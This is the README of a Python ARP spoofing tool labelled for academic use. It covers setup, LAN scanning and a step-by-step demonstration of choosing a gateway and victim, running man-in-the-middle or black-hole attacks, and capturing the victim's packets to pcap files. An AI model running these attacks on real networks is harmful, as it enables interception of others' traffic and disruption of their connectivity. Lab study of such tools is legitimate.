## ARPSpoofing
![](https://img.shields.io/badge/platform-Linux--64-brightgreen)
![](https://img.shields.io/badge/OS-Ubuntu%2018.04%20LTS-orange)
![](https://img.shields.io/badge/python-2.7-blue)

### Description
A tool for LAN scanning, ARP attacking and packets capturing.  
For academic use only.

### Prerequisite environment setup

Install python related modules by using the following commands:  
1. `sudo apt install python`  
2. `sudo apt install python-pandas`
3. `sudo apt install python-pip`
4. `sudo pip install --upgrade pip enum34`
5. `sudo apt-get update -y`
6. `sudo apt-get install -y scapy`
7. `sudo apt-get install -y python-netifaces`

Download OUI MAC list from the following link:  
[Download MAC list](https://macaddress.io/database-download/csv)
then rename the csv file as `mac_address.csv` and place at the same directory.  
This file will be converted to database in run-time.

### Usage
`sudo python arp_spoofing.py`  
![gif](https://github.com/DuvetDays/ARPSpoofing/blob/master/arp%20spoofing_1.gif?raw=true)  
`Ctrl + C` to stop the program  
### Demonstration
[step1] Select **network interface**  
```
[Info.] Available network interface list:
[1]: lo, MAC:[{'peer': '00:00:00:00:00:00', 'addr': '00:00:00:00:00:00'}]
[2]: ens33, MAC:[{'broadcast': 'ff:ff:ff:ff:ff:ff', 'addr': '00:0c:29:xx:xx:xx'}]
```
[step2] Input **IP range** of subnet that you want to scan 
```
[Info.] Network config: [{'broadcast': '192.168.0.255', 'netmask': '255.255.255.0', 'addr': '192.168.0.93'}]
[Info.] MAC info: [{'broadcast': 'ff:ff:ff:ff:ff:ff', 'addr': '00:0c:29:xx:xx:xx'}]
[Enter] Please input the IP range you want to scan (e.g., 192.168.0.0/24):
```
[step3] Select **gateway** and **victim** in host list
```
[Info.] Host list:
  No.  |       IP        |         MAC         |                 Company                  
[  1  ]:   192.168.0.1   -  84:0B:7C:xx:xx:xx  -             Hitron Tech Inc              
[  2  ]:  192.168.0.20   -  44:CB:8B:xx:xx:xx  -                LG innotek                
[  3  ]:  192.168.0.32   -  C8:69:CD:xx:xx:xx  -                Apple, Inc                
[  4  ]:  192.168.0.43   -  34:13:E8:xx:xx:xx  -                Intel Corp                
[  5  ]:  192.168.0.46   -  CC:F4:11:xx:xx:xx  -               Google, Inc                
[  6  ]:  192.168.0.60   -  D4:C8:B0:xx:xx:xx  -   Prime Electronics & Satellitics Inc    
[  7  ]:  192.168.0.106  -  4C:56:9D:xx:xx:xx  -                Apple, Inc 

[Info.] Scan completed.
[Info.] Scan duration: 0:00:39.118150 sec.
[Info.] Device number in the subnet: 7
```
[step4] Select **attacking mode**  
```
[Info.] Please select an attacking mode:
[1] Man in the middle(MITM)
[2] Black Hole
[Enter] Function:
```
[step5] Select **sniffing mode** (if in MITM mode)  
```
[Info.] Please select the sniffing mode you want:
[1] All packets in the specific network interface
[2] Only packets related to the victim
[Enter] Sniffing mode:
```
[step6] Start to attack victim and record packets into .pacp file in the same directory
(p.s. you can use **wireshark** to open and trace .pcap file)
```
BlackHole_traffic_log.pcap  MITM_traffic_log.pcap
```
[step7] `Ctrl + C` to stop running program and restore the LAN automatically
```
[Exception] <type 'exceptions.KeyboardInterrupt'> 
[Info.] Start to recover the LAN.
[Info.] Please wait for a while.
[Info.] Sending real ARP replies to gateway...
........
Sent 8 packets.
[Info.] Sending real ARP replies to victim...
........
Sent 8 packets.
[Info.] The LAN has been recovered.
[Info.] Man in the middle(MITM) attack is over.
[Info.] Program is shutting down.
```
